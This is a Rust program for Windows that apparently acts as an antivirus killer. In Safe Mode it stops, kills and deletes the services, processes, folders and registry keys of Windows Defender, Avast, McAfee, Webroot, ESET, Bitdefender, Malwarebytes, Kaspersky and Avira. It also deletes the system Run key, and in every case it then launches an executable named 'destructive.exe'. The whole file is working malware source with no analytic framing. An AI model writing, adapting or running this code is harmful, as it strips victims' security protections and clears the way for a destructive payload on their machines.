use std::process::{Command, exit};
use std::io::{self};
use std::path::Path;
use std::collections::HashMap;
use std::env;
use wmi::{WMIConnection, COMLibrary};
use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
use windows::Win32::Foundation::BOOL;


fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn execute_command(command: &str) {
    let status = Command::new("cmd")
        .args(&["/C", command])
        .status();

    match status {
        Ok(status) if status.success() => println!("[+] Command succeeded: {}", command),
        Ok(status) => eprintln!("[!] Command failed with status {}: {}", status, command),
        Err(e) => eprintln!("[!] Failed to execute command {}: {}", command, e),
    }
}

fn is_safe_mode() -> bool {
    let mut mode: u32 = 0;
    unsafe {
        if GetOsSafeBootMode(&mut mode as *mut u32) == BOOL(1) {
            // SAFEMODE_MINIMAL (1) or SAFEMODE_NETWORK (2) indicates Safe Mode
            mode == 1 || mode == 2
        } else {
            false
        }
    }
}

fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
    // Create the COM library instance
    let com_lib = COMLibrary::new()?;
    // Pass the COMLibrary instance to WMIConnection::new
    let wmi_con = WMIConnection::new(com_lib)?;

    // Query to get antivirus product information
    let query = "SELECT * FROM AntivirusProduct";
    // Use the ? operator to extract the Vec on success.
    let results: Vec<HashMap<String, String>> = wmi_con.raw_query(query)?;

    // Loop through the results and extract the executable path's folder
    for result in results {
        if let Some(path) = result.get("pathToSignedProductExe") {
            // Extract the folder path
            if let Some(folder_path) = Path::new(path).parent() {
                println!("Executable folder path: {}", folder_path.display());

                // Remove the folder using rd /s /q (silent remove)
                let folder_path_str = folder_path.to_str().ok_or("Invalid path")?;
                let status = Command::new("cmd")
                    .args(&["/C", "rd", "/s", "/q", folder_path_str])
                    .status()?;

                if status.success() {
                    println!("Successfully removed the folder: {}", folder_path.display());
                } else {
                    eprintln!("Failed to remove the folder: {}", folder_path.display());
                }
            }
        }
    }

    Ok(())
}

fn main() -> io::Result<()> {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        exit(0); // Exit the program with a success status
    }

    // Check for Safe Mode before proceeding
    if is_safe_mode() {
        println!("Safe Mode detected, proceeding with actions...");

        // Declare a mutable vector to hold all the commands.
        let mut commands: Vec<&str> = Vec::new();

        // Group 2: Cleanup Safe Mode setting
        commands.push("bcdedit /deletevalue {current} safeboot");

        // Group 3: Webroot services and files cleanup
        let webroot_cmds = vec![
            "sc delete WRSkyClient",
            "sc delete WRCoreService",
            "sc delete WRSVC",
            "sc stop WRSkyClient",
            "sc stop WRCoreService",
            "sc stop WRSVC",
            "del /f /y \"%SystemRoot%\\System32\\Drivers\\wrkrn.sys\"",
            "del /f /y \"%SystemRoot%\\System32\\wruser.dll\"",
            "rd /s /q \"%ProgramFiles%\\Webroot\"",
            "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
            "rd /s /q \"%ProgramData%\\WRCore\"",
            "rd /s /q \"%ProgramData%\\WRData\"",
            "rd /s /q \"%ProgramData%\\WRData\"",
            "rd /s /q \"%ProgramFiles%\\Webroot\"",
            "rd /s /q \"%ProgramFiles(x86)%\\Webroot\"",
            "rd /s /q \"%ProgramData%\\WRCore\"",
        ];
        commands.extend(webroot_cmds);

        // Group 4: Avira files cleanup
        let avira_cmds = vec![
            "rd /s /q \"%ProgramFiles%\\Avira\"",
            "rd /s /q \"%ProgramFiles(x86)%\\Avira\"",
            "rd /s /q \"%ProgramData%\\Avira\"",
        ];
        commands.extend(avira_cmds);

        // Group 5: McAfee files cleanup
        let mcafee_files_cmds = vec![
            "rd /s /q \"%ProgramData%\\McAfee\"",
            "rd /s /q \"%ProgramFiles%\\McAfee\"",
            "rd /s /q \"%ProgramFiles(x86)%\\McAfee\"",
        ];
        commands.extend(mcafee_files_cmds);

        // Group 6: Kill antivirus processes
        let kill_processes_cmds = vec![
            "taskkill /F /IM AvastSvc.exe /T",
            "taskkill /F /IM AvastUI.exe /T",
            "taskkill /F /IM AvastWscReporter.exe /T",
            "taskkill /F /IM aswVmm.exe /T",
            "taskkill /F /IM MBAMService.exe /T",
            "taskkill /F /IM MsMpEng.exe /T",
            "taskkill /F /IM VSSERV.exe /T",
        ];
        commands.extend(kill_processes_cmds);

        // Group 7: Stop antivirus services
        let stop_services_cmds = vec![
            "sc stop \"AvastSvc\"",
            "sc stop \"AvastWscReporter\"",
            "sc stop \"aswVmm\"",
            "sc stop \"MBAMService\"",
            "sc stop \"WinDefend\"",
            "sc stop \"VSSERV\"",
            "sc stop \"McAfee Service Controller\"",
            "sc stop \"McAfee Firewall Core Service\"",
            "sc stop \"McAfee Validation Trust Protection\"",
        ];
        commands.extend(stop_services_cmds);

        // Group 8: Delete antivirus services
        let delete_services_cmds = vec![
            "sc delete \"AvastSvc\"",
            "sc delete \"AvastWscReporter\"",
            "sc delete \"aswVmm\"",
            "sc delete \"MBAMService\"",
            "sc delete \"WinDefend\"",
            "sc delete \"VSSERV\"",
            "sc delete \"McAfee Service Controller\"",
            "sc delete \"McAfee Firewall Core Service\"",
            "sc delete \"McAfee Validation Trust Protection\"",
        ];
        commands.extend(delete_services_cmds);

        // Group 9: Delete registry keys for antivirus programs
        let delete_registry_cmds = vec![
            // Startup keys
            "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f",
            // Avast-related keys
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbIDSAgent\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbIDSAgent\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswApPct\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswApPct\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbidsdriver\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbidsdriver\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbidsh\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbidsh\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswbuniv\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswbuniv\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswElam\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswElam\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswKbd\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswKbd\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswMonFit\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswMonFit\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswNetHub\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswNetHub\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswRdr\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswRdr\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\aswRvrt\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\aswRvrt\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\avast! Antivirus\" /f",
            // Webroot keys
            "reg delete \"HKLM\\SOFTWARE\\WOW6432Node\\Webroot\" /f",
            "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WRUNINST\" /f",
            "reg delete \"HKLM\\SOFTWARE\\WRData\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\services\\WRSVC\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\services\\WRSVC\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\WRSVC\" /f",
            // Windows Defender keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\WinDefend\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\WinDefend\" /f",
            // Kaspersky 21.3 keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AVP21.3\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\AVP21.3\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\AVP21.3\" /f",
            // Malwarebytes keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MBAMService\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\MBAMService\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\MBAMService\" /f",
            // Bitdefender keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSSERV\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\VSSERV\" /f",
            "reg delete \"HKLM\\SYSTEM\\ControlSet002\\Services\\VSSERV\" /f",
            // ESET keys
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\eamonm\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\edevmon\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ehdrv\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ekbdflt\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ekrn\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\epfw\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\epfwwfp\" /f",
            "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\ESETCleanersDriver\" /f",
            // Avira key
            "reg delete HKLM\\SOFTWARE\\AVIRA /f",
        ];
        commands.extend(delete_registry_cmds);

        // Execute each command in order
        for command in commands {
            execute_command(command);
        }
        
        // Group 10: Reboot the system to Safe Mode if needed
        if let Err(e) = remove_antivirus_folder() {
            eprintln!("Error removing antivirus folder: {}", e);
        }

        if let Ok(program_files) = env::var("ProgramFiles") {
            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
            let _ = Command::new(&executable_path).spawn(); // Ignore errors
        }

        println!("[+] Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.");
    } else {
        println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
        if let Ok(program_files) = env::var("ProgramFiles") {
            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
            let _ = Command::new(&executable_path).spawn(); // Ignore errors
        }
    }

    Ok(())
}
